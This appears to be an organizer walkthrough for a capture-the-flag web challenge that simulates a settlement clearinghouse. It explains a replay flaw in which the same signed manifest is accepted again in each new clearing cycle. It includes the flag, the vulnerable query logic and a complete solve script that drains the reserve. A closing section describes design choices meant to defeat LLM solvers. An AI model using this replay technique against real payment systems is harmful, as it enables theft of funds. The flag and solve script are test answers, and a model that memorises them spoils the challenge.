# Organizer Walkthrough: Chakravyuh Sovereign Settlement Gateway

## Challenge Summary

- **Title**: Chakravyuh Sovereign Settlement Gateway
- **Category**: Web / Fintech Protocols
- **Points**: 175
- **Estimated Solve Time**: 45–75 minutes
- **Flag**: `CHAKRAVYUHA{s4pt4r4th4_cl34r1ng_st4t3_d3sync_x891b}`

---

## 1. Educational Concept & Vulnerability Overview

The challenge models a high-assurance financial clearinghouse that enforces multi-stage settlement pipelines across concentric rings of validation. The application asserts that all settlements are:
> *"authenticated, ordered, and processed exactly once."*

However, the architecture contains an **inter-layer state synchronization flaw**:
- The Ingestion layer (`POST /api/pipeline/intake`) validates the Ed25519 signature of the treasury manifest and checks for duplicate ingestion **scoped only to the active clearing cycle**:
  ```python
  duplicate_in_cycle = db.query(CycleStagingRecord).filter(
      CycleStagingRecord.channel_id == channel.channel_id,
      CycleStagingRecord.cycle_number == channel.current_cycle,
      CycleStagingRecord.instruction_ref == instruction_ref
  ).first()
  ```
- The Ledger layer (`POST /api/pipeline/disburse`) enforces uniqueness on the internal payment token (`voucher_ref`), which is derived from the ephemeral earmark ticket generated during that cycle.
- The Receipt Finalization layer (`POST /api/receipts/finalize`) archives the batch buffer, increments `channel.current_cycle += 1`, and resets `channel.pipeline_stage = 'IDLE'`.
- The signed treasury manifest itself (`TX-VYUHA-8841-A`) carries a fixed validity timestamp and is **never permanently bound or invalidated across cycle boundaries**.

As a result, a player who completes a 4-ring clearing cycle can re-submit the **exact same validly signed manifest** in Cycle 2, Cycle 3, etc. Each execution drains 150.00 SDR from the sovereign pool reserve. When the reserve drops below the **Statutory Solvency Floor (250.00 SDR)**, calling the supervisory reconciliation endpoint (`POST /api/channel/reconcile`) triggers the emergency regulatory intervention protocol, releasing the contingency attestation seal containing the flag.

---

## 2. Application State Machine

Each participant channel operates under a strict finite-state machine:

```
                      POST /api/channel/open
                                |
                                v
               +-------------> IDLE <---------------------+
               |                 |                        |
               |                 | POST /api/pipeline/intake (Valid Ed25519)
               |                 v                        |
               |          INTAKE_VALIDATED                |
               |                 |                        |
               |                 | POST /api/pipeline/earmark (Earmark Ticket)
               |                 v                        |
               |          RESERVE_EARMARKED               |
               |                 |                        |
               |                 | POST /api/pipeline/disburse (Clearance Voucher)
               |                 v                        |
               |             DISBURSED                    |
               |                 |                        |
               |                 | POST /api/receipts/finalize
               +-----------------+ (Archives cycle, increments cycle_counter)
```

### Why Naive Replay Fails:
1. **Immediate duplicate intake**: Calling `POST /api/pipeline/intake` twice consecutively fails with `409 Conflict: ERR_STAGE_OCCUPIED` (stage is `INTAKE_VALIDATED`).
2. **Immediate duplicate earmark**: Calling `POST /api/pipeline/earmark` again fails with `409 Conflict: ERR_INVALID_TRANSITION`.
3. **Immediate duplicate disburse**: Calling `POST /api/pipeline/disburse` with the same voucher fails with `409 Conflict: ERR_VOUCHER_COMMITTED` because the double-entry journal records that voucher.
4. **Forging a new manifest**: Modifying any field (such as changing the quantum or instruction reference) invalidates the Ed25519 signature verified against the sovereign authority public key (`VAULT-CHAKRA-PRIME`).

---

## 3. Vulnerable Interaction

The vulnerability emerges strictly from the **interaction across all four pipeline stages**:
1. Cycle 1 begins in `IDLE`.
2. `POST /api/pipeline/intake` checks: Is `TX-VYUHA-8841-A` already recorded for `cycle_number == 1`? No.
3. Player advances through `earmark` and `disburse`.
4. Reserve decreases from `1000.00` to `850.00`; Channel balance increases from `0.00` to `150.00`.
5. `POST /api/receipts/finalize` seals Cycle 1, updates `current_cycle` to `2`, and resets `pipeline_stage` to `IDLE`.
6. In Cycle 2, `POST /api/pipeline/intake` checks: Is `TX-VYUHA-8841-A` recorded for `cycle_number == 2`? **No.**
7. A new earmark ticket and clearance voucher are derived for Cycle 2, allowing another 150.00 SDR disbursement.

---

## 4. Liquidity Accounting & Target State

- **Initial Pool Reserve**: 1000.00 SDR
- **Statutory Solvency Floor**: 250.00 SDR
- **Disbursement per Cycle**: 150.00 SDR

| Cycle # | Reserve Balance | Status Assessment | Reconciliation Response |
| :---: | :---: | :---: | :---: |
| 0 (Initial) | 1000.00 SDR | Healthy (100%) | `RECONCILIATION_COMPLIANT` |
| 1 | 850.00 SDR | Healthy (85%) | `RECONCILIATION_COMPLIANT` |
| 2 | 700.00 SDR | Healthy (70%) | `RECONCILIATION_COMPLIANT` |
| 3 | 550.00 SDR | Healthy (55%) | `RECONCILIATION_COMPLIANT` |
| 4 | 400.00 SDR | Warning (40%) | `RECONCILIATION_COMPLIANT` |
| 5 | 250.00 SDR | At Threshold (25%) | `RECONCILIATION_COMPLIANT` |
| **6** | **100.00 SDR** | **CRITICAL DEFICIT (10%)** | **`RECONCILIATION_DEFICIT_TRIGGERED`** |

After Cycle 6 completes, the pool reserve is at `100.00 SDR`, strictly below the `250.00 SDR` floor. Calling `POST /api/channel/reconcile` detects the insolvency deficit and emits the contingency resolution object.

---

## 5. Exploit Script (`solve.py`)

Below is the complete reference solve script:

```python
import requests
import json

BASE_URL = "http://localhost:8000"

def solve():
    session = requests.Session()

    # Step 1: Open a new participant settlement channel
    open_res = session.post(f"{BASE_URL}/api/channel/open", json={"participant_urn": "urn:vyuha:solver"}).json()
    channel_id = open_res["channel_id"]
    print(f"[*] Initialized channel: {channel_id}")

    # Step 2: Fetch the attested sovereign manifest
    manifest_data = session.get(f"{BASE_URL}/api/instructions/manifest").json()
    manifest = manifest_data["manifest"]
    auth_key = manifest_data["authority_key"]
    signature = manifest_data["signature"]
    print(f"[*] Retrieved sovereign manifest for instruction: {manifest['instruction_ref']}")

    # Step 3: Run the full 4-ring clearing lifecycle 6 times
    for cycle in range(1, 7):
        print(f"\n[+] Executing Clearing Cycle {cycle}...")

        # Ring I: Intake
        intake_res = session.post(f"{BASE_URL}/api/pipeline/intake", json={
            "channel_id": channel_id,
            "manifest": manifest,
            "authority_key": auth_key,
            "signature": signature
        }).json()
        ticket = intake_res["earmark_ticket"]
        print(f"    Ring I (Intake): Accepted, Ticket={ticket}")

        # Ring II: Earmark
        earmark_res = session.post(f"{BASE_URL}/api/pipeline/earmark", json={
            "channel_id": channel_id,
            "ticket": ticket
        }).json()
        voucher = earmark_res["clearance_voucher"]
        print(f"    Ring II (Earmark): Collateral reserved, Voucher={voucher}")

        # Ring III: Disburse
        disburse_res = session.post(f"{BASE_URL}/api/pipeline/disburse", json={
            "channel_id": channel_id,
            "voucher": voucher
        }).json()
        print(f"    Ring III (Disburse): Posted Journal {disburse_res['journal_id']}, Reserve={disburse_res['remaining_reserve']} SDR")

        # Ring IV: Finalize
        finalize_res = session.post(f"{BASE_URL}/api/receipts/finalize", json={
            "channel_id": channel_id
        }).json()
        print(f"    Ring IV (Finalize): Sealed Certificate {finalize_res['certificate_id']}")

    # Step 4: Perform supervisory reconciliation on the deficit state
    print("\n[*] Invoking Supervisory Reconciliation on drained reserve...")
    reconcile_res = session.post(f"{BASE_URL}/api/channel/reconcile", json={
        "channel_id": channel_id
    }).json()

    print("[*] Reconciliation Response:")
    print(json.dumps(reconcile_res, indent=2))

    contingency = reconcile_res.get("contingency_resolution", {})
    flag = contingency.get("attestation_anchor")
    print(f"\n[!] FLAG RECOVERED: {flag}")
    assert flag.startswith("CHAKRAVYUHA{"), "Flag extraction failed!"

if __name__ == "__main__":
    solve()
```

---

## 6. Verification of Quality & Anti-AI Resistances

1. **Grep-Resistant**: No instances of `replay`, `flag`, `exploit`, `vulnerable`, `double_spend`, `nonce`, or `hack` in any source files, routes, or frontend labels.
2. **Cryptographically Sound**: Ed25519 signing with canonical JSON serialization. The signature cannot be forged or bypassed.
3. **Multi-Step State Reasoning**: An LLM cannot simply read an endpoint name or find a single buggy line. It must trace how `CycleStagingRecord`, `SettlementChannel`, `LedgerJournalEntry`, and `SettlementCertificate` interact across cycles.
4. **Legitimate UI & Decoy Modules**: The application features realistic institution directory lookups, double-entry journals, receipt exports, and channel settings.
